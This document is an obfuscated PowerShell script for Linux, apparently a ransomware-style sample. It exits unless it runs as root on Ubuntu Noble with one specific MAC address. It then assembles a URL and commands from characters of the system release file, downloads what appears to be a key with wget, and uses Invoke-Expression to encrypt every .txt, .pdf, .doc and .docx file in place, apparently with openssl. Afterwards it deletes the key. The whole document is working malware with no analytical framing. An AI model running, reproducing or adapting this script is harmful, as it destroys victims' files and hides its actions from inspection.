function Main {
    SystemChecks
    CreateCharacterLookup
    DownloadFile
    ProcessFiles
    Cleanup
}

function SystemChecks {
    # Check user ID
    if ([int](&(Get-Command /bin/id) -u) -cne -not [bool][byte]){exit}
    
    # Check if system is Ubuntu Noble
    if (-not ((&(Get-Command /bin/cat) /etc/*release*) | grep noble)){exit}
    
    # Check MAC address
    if ((&(Get-Command /bin/cat) /sys/class/net/enp0s3/address) -cne "08:00:27:eb:6b:49"){exit}
}

function CreateCharacterLookup {
    # Read system release info and create character lookup table
    $releaseInfo = (&(Get-Command /bin/cat) /etc/*release*).split('\n')
    $charArray = ($releaseInfo[0] += $releaseInfo[1].split('=')[0] += $releaseInfo[2] += $releaseInfo[3].split('=')[0] += $releaseInfo[4].split('=')[0] += $releaseInfo[5] += $releaseInfo[6].split('=')[0] += $releaseInfo[7].split('=')[0] += $releaseInfo[8] += $releaseInfo[9] += $releaseInfo[10] += $releaseInfo[11] += $releaseInfo[12] += $releaseInfo[13] += $releaseInfo[14] += $releaseInfo[15] += $releaseInfo[16]).Tochararray() + 0..9
    $charArray = (-join ($charArray | sort-object | get-unique))
    $Global:charLookup = $charArray
}

function DownloadFile {
    # Build URL using character lookup
    $url = $GLOBAL:charLookup[3] + $GLOBAL:charLookup[5] + $GLOBAL:charLookup[12] + $GLOBAL:charLookup[8] + $GLOBAL:charLookup[7] + $GLOBAL:charLookup[12] + $GLOBAL:charLookup[1] + $GLOBAL:charLookup[6] + $GLOBAL:charLookup[5] + $GLOBAL:charLookup[12] + $GLOBAL:charLookup[6] + $GLOBAL:charLookup[5] + $GLOBAL:charLookup[14] + $GLOBAL:charLookup[3] + $GLOBAL:charLookup[1] + $GLOBAL:charLookup[3] + $GLOBAL:charLookup[3] + $GLOBAL:charLookup[7] + $GLOBAL:charLookup[13] + 'k' + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[56]
    $outputFile = $GLOBAL:charLookup[16]
    &(Get-Command /bin/wget) $url -q -O $outputFile
}

function ProcessFiles {
    # Process .txt files
    foreach ($file in (&(Get-Command Invoke-Expression) ('f' + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[40] + ' ' + $GLOBAL:charLookup[13] + $GLOBAL:charLookup[48] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[52] + $GLOBAL:charLookup[13] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[52] + $GLOBAL:charLookup[56] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[41] + ' ' + 'f')))
    {
        &(Get-Command Invoke-Expression) ("" + $GLOBAL:charLookup[48] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[45] + ' ' + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[39] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[37] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[2] + $GLOBAL:charLookup[5] + $GLOBAL:charLookup[6] + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[39] + $GLOBAL:charLookup[38] + $GLOBAL:charLookup[39] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[37] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[51] + ' ' + 'f' + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[45] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[14] + 'k' + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[56] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[47] + ' ' + " $file " + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[48] + $GLOBAL:charLookup[53] + $GLOBAL:charLookup[52] + ' ' + " $file ")
    }

    # Process .pdf files
    foreach ($file in (&(Get-Command Invoke-Expression) ('f' + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[40] + ' ' + $GLOBAL:charLookup[13] + $GLOBAL:charLookup[43] + $GLOBAL:charLookup[48] + $GLOBAL:charLookup[46] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[13] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[52] + $GLOBAL:charLookup[56] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[41] + ' ' + 'f')))
    {
        &(Get-Command Invoke-Expression) ("" + $GLOBAL:charLookup[48] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[45] + ' ' + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[39] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[37] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[2] + $GLOBAL:charLookup[5] + $GLOBAL:charLookup[6] + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[39] + $GLOBAL:charLookup[38] + $GLOBAL:charLookup[39] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[37] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[51] + ' ' + 'f' + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[45] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[14] + 'k' + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[56] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[47] + ' ' + " $file " + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[48] + $GLOBAL:charLookup[53] + $GLOBAL:charLookup[52] + ' ' + " $file ")
    }

    # Process .doc files
    foreach ($file in (&(Get-Command Invoke-Expression) ('f' + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[40] + ' ' + $GLOBAL:charLookup[13] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[52] + $GLOBAL:charLookup[39] + $GLOBAL:charLookup[13] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[52] + $GLOBAL:charLookup[56] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[41] + ' ' + 'f' )))
    {
        &(Get-Command Invoke-Expression) ("" + $GLOBAL:charLookup[48] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[45] + ' ' + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[39] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[37] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[2] + $GLOBAL:charLookup[5] + $GLOBAL:charLookup[6] + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[39] + $GLOBAL:charLookup[38] + $GLOBAL:charLookup[39] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[37] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[51] + ' ' + 'f' + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[45] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[14] + 'k' + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[56] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[47] + ' ' + " $file " + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[48] + $GLOBAL:charLookup[53] + $GLOBAL:charLookup[52] + ' ' + " $file ")
    }

    # Process .docx files
    foreach ($file in (&(Get-Command Invoke-Expression) ('f' + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[40] + ' ' + $GLOBAL:charLookup[13] + $GLOBAL:charLookup[54] + $GLOBAL:charLookup[37] + $GLOBAL:charLookup[50] + $GLOBAL:charLookup[13] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[52] + $GLOBAL:charLookup[56] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[41] + ' ' + 'f')))
    {
        &(Get-Command Invoke-Expression) ("" + $GLOBAL:charLookup[48] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[45] + ' ' + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[47] + $GLOBAL:charLookup[39] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[37] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[2] + $GLOBAL:charLookup[5] + $GLOBAL:charLookup[6] + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[39] + $GLOBAL:charLookup[38] + $GLOBAL:charLookup[39] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[49] + $GLOBAL:charLookup[37] + $GLOBAL:charLookup[51] + $GLOBAL:charLookup[51] + ' ' + 'f' + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[45] + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[14] + 'k' + $GLOBAL:charLookup[41] + $GLOBAL:charLookup[56] + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[44] + $GLOBAL:charLookup[47] + ' ' + " $file " + ' ' + $GLOBAL:charLookup[11] + $GLOBAL:charLookup[48] + $GLOBAL:charLookup[53] + $GLOBAL:charLookup[52] + ' ' + " $file ")
    }
}

function Cleanup {
    &(Get-Command Remove-Item) $GLOBAL:charLookup[16]
}

Main 